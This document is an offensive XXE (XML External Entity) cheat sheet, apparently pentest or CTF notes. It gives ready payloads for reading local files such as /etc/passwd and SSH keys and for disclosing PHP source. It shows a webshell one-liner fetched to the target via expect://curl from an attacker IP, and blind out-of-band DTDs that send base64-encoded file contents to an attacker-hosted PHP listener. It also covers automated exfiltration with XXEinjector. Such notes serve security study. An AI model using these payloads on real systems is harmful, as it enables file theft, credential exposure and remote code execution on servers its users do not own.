XXE = XML External Entity
# Overview
On webpages, sometimes during a POST we can input information that utilizes XML

Example Form
```xml
<?xml version = "1.0"?>
	<order>
		<quantity>
	        4
		</quantity>
		<item>
			banana
		</item>
	</order>
```

We can abuse these forms using XXEs
General syntax
```xml
<!DOCTYPE var1 [
<!ENTITY var2 "some random text here">
]>
```

Example of XXE attack
```xml
<?xml version = "1.0"?>
	<!DOCTYPE foo [
	<!ENTITY example "get pwned xD">
	]>
	<order>
		<quantity>
	        4
		</quantity>
		<item>
			&example;
		</item>
	</order>
```
when we POST this, instead of printing "banana", it will print "get pwned xD"


# Initial Discovery & Syntax Validation
Before attempting exfiltration, verify if the XML parser evaluates external entities.

Basic Probe
```xml
<?xml version="1.0"?>
<!DOCTYPE test [ <!ENTITY probe "XXE_VULN_CONFIRMED"> ]>
<data>&probe;</data>
```
If `XXE_VULN_CONFIRMED` reflects in the response, proceed to In-Band Exploitation. If the application processes the XML but returns no reflection, proceed to Blind/OOB Exploitation.

# In-Band Exploitation (Reflected Output)
Use these techniques when the application directly reflects the parsed XML entity back in the HTTP response.
#### Local File Disclosure (LFD)
NOTE: Always check target OS. Do not forget Windows targets (`C:\Windows\win.ini`, `C:\Windows\System32\drivers\etc\hosts`)

Standard File Read
```xml
<!DOCTYPE var1 [
<!ENTITY var2 SYSTEM 'file:///etc/passwd'>
]>
```
This is an example... consider ssh keys as well, just like you would an LFI
#### Source Code Disclosure (PHP Wrappers)
Prevents the XML parser from crashing reading files containing XML/HTML tags (e.g., `<php?`).

Source Code Disclosure
```xml
<!DOCTYPE var1 [
<!ENTITY var2 SYSTEM 'php://filter/convert.base64-encode/resource=<file>.php'>
]>
```
#### Remote Code Execution (RCE)
Highly dependent on the target environment. Requires the PHP `expect` module to be installed and enabled (`allow_url_include` is often related, but `expect` is a separate PECL extension).

Workflow
```bash
# Create webshell php file and host it
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
python3 -m http.server 80
```
```xml
<!DOCTYPE var1 [
<!ENTITY var2 SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
```


# Blind & Out-of-Band (OOB) Exploitation
Use these techniques when the application does not reflect the entity output, or when standard LFD is blocked by parsing errors. These require using **Parameter Entities (`%`)** and an external DTD.
#### Error-Based Exfiltration
Forces the XML parser to throw a verbose error containing the contents of the target file. Useful if OOB outbound traffic is blocked by a firewall, but errors are displayed.

1. Test for Errors
```xml
<!-- Send malformed data to get an error. ie: <roo> instead of <root> -->

<?xml version = "1.0"?>
	<roo>
		...
```
If errors don't even print, you can try proceeding to next attack.

2. Setup Attacker Infrastructure (Host `xxe.dtd`)
```bash
echo '<!ENTITY % file SYSTEM "file:///etc/hosts">' > xxe.dtd
echo '<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">' >> xxe.dtd

python3 -m http.server 8000
```

3. Injection Payload
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

#### Blind OOB Data Exfiltration
Instead of relying on errors printing, this forces the target server to read the file and send its contents to your infrastructure via HTTP GET parameters.

1. Attacker Infrastructure (Listener & DTD)
```php
// vim index.php to create out index.php file...
// index.php (Catch, decode, and print the exfiltrated data)
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
```Bash
# Create DTD file
echo '<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">' > xxe.dtd
echo '<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">' >> xxe.dtd

# Start PHP built-in server to host DTD and catch the callback
php -S 0.0.0.0:8000
```

2. Injection Payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```
Using this, we should catch the data in our terminal

#### Exfiltrating Data w/ Special Characters (CDATA Wrapper)
If you cannot use `php://filter` (e.g., target is Java/.NET) but need to exfiltrate data containing `<` or `&`, wrap the output in CDATA tags using an external DTD.

1. Attacker Infrastructure (Host `xxe.dtd`)
```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

2. Injection Payload
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">                         <!-- prepend CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/FILE.php">   <!-- external file -->
  <!ENTITY % end "]]>">                              <!-- end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">       <!-- reference DTD -->
  %xxe;
]>
...
<email>&joined;</email>   <!-- reference &joined; entity to print file content -->
```

# Automated OOB Exfiltration
When manual exploitation is too slow or complex, leverage automated tooling to handle the DTD generation and server callbacks.

**Tool:** XXEinjector

[XXEinjector](https://github.com/enjoiz/XXEinjector)
```bash
# 1. Clone the repository
git clone https://github.com/enjoiz/XXEinjector.git

# 2. Prepare the Request File
# Copy the raw HTTP Request from Burp Suite into a text file (e.g., req.txt)
# Replace the injection point value with the keyword XXEINJECT

# Example req.txt:
# POST /submit HTTP/1.1
# Host: target.com
# ...
# <?xml version="1.0"?><root>XXEINJECT</root>

# 3. Execute the Tool
ruby XXEinjector.rb --host=[YOUR_TUN0_IP] --httpport=8000 --file=req.txt --path=/etc/passwd --oob=http --phpfilter

# 4. Review the extracted data in the generated 'Logs' folder.
```